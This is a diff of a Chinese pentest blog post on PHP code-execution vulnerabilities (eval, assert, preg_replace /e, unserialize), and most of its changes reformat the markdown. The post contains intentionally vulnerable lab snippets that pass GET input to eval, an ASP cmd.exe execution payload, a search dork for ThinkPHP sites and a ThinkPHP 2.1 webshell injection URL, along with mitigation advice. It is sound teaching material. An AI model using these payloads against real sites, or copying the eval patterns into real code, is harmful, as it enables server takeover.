@@ -3,19 +3,16 @@ date = "2016-07-25T22:32:51+08:00"
 description = ""
 draft = false
 tags = ["代码执行"]
-title = "代码执行漏洞"
+title = "代码执行漏洞(一)"
 topics = ["Pentest"]
 
 +++
 
 ### 0x00 代码执行
-> ```
-当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，
-没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
-```
+当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。
 
 ### 0x01 相关函数
-> ```
+```
 PHP：eval assert
 Python：exec
 asp：<%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%>
@@ -23,7 +20,7 @@ Java：没有类似函数，但采用的反射机制和各种基于反射机制�
 ```
 
 ### 0x02 phpcms中的string2array函数
-> 这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
+这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组
 ```
 array(  //这个是字符串形式的数组，它并不是数组，而是字符串
     'upload_maxsize' => '2048',
@@ -48,21 +45,19 @@ function string2array($data) {
 ```
 
 ### 0x03 漏洞危害
-> ```
-执行代码
-让网站写shell
-甚至控制服务器
-```
+* 执行代码
+* 让网站写shell
+* 甚至控制服务器
 
 ### 0x04 漏洞分类(也是利用点)
-> ```
+```
 执行代码的函数：eval、assert
 callback函数：preg_replace + /e模式
 反序列化：unserialize()(反序列化函数)
 ```
 
 ### 0x05 漏洞挖掘
-> ```
+```
 框架找漏洞，如ThinkPHP：
   inurl:index.php intext:ThinkPHP 2.1 { Fast & Simple OOP PHP Framework }
 框架的URL格式如下：
@@ -76,69 +71,61 @@ callback函数：preg_replace + /e模式
 
 ### 0x06 搭建环境实验
 * 示例一
-
-> ```php
+```php
 <?php
     $data = $_GET['data'];
     eval("\$ret = $data;");
     echo $ret;
 ?>
 ```
-{{% fluid_img src="/img/post/code_execution_eval1.png" alt="代码执行漏洞使用eval函数1.png" %}}
+![代码执行漏洞使用eval函数1](/img/post/code_execution_eval1.png)
 
 * 示例二
-
-> ```php
+```php
 <?php
     $data = $_GET['data'];
     eval("\$ret = strtolower('$data');");
     echo $ret;
 ?>
 ```
-{{% fluid_img src="/img/post/code_execution_eval2.png" alt="代码执行漏洞使用eval函数2.png" %}}
+![代码执行漏洞使用eval函数2](/img/post/code_execution_eval2.png)
 
 * 示例三
-
-> ```php
+```php
 <?php
     $data = $_GET['data'];
     eval("\$ret = strtolower(\"$data\");");
     echo $ret;
 ?>
 ```
-{{% fluid_img src="/img/post/code_execution_eval3.png" alt="代码执行漏洞使用eval函数3.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/code_execution_eval4.png" alt="代码执行漏洞使用eval函数4.png" %}}
+![代码执行漏洞使用eval函数3](/img/post/code_execution_eval3.png)
+![代码执行漏洞使用eval函数4](/img/post/code_execution_eval4.png)
 
 * 示例四
-
-> ```php
+```php
 <?php
     $data = $_GET['data'];
     eval("\$ret = strtolower(\"$data\");");
     echo $ret;
 ?>
 ```
-{{% fluid_img src="/img/post/code_execution_eval5.png" alt="代码执行漏洞使用eval函数5.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/code_execution_eval6.png" alt="代码执行漏洞使用eval函数6.png" %}}
+![代码执行漏洞使用eval函数5](/img/post/code_execution_eval5.png)
+![代码执行漏洞使用eval函数6](/img/post/code_execution_eval6.png)
 
-* 示例五
-
-> mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])  
+* 示例五  
+mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])  
 /e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)
-
-> ```php
+```php
 <?php
     $data = $_GET['data'];
     $ret = preg_replace('/<data>(.*?)<\/data>/e','$ret = "\\1"',$data);
     echo $ret;
 ?>
 ```
-{{% fluid_img src="/img/post/code_execution_preg_replace.png" alt="代码执行漏洞使用preg_replace函数.png" %}}
+![代码执行漏洞使用preg_replace函数](/img/post/code_execution_preg_replace.png)
 
 ### 0x07 具体操作
-> ```
+```
 # 一般找CMS相应版本漏洞，如ThinkPHP2.1
 * 一句话
     http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
@@ -159,5 +146,4 @@ callback函数：preg_replace + /e模式
 * 放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换
 * 若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象
 
-<br />
-下一篇：http://wyb0.com/posts/code-execution-vulnerabilities-2/
+#### 下一篇：[代码执行漏洞(二)](/posts/code-execution-vulnerabilities-2/)
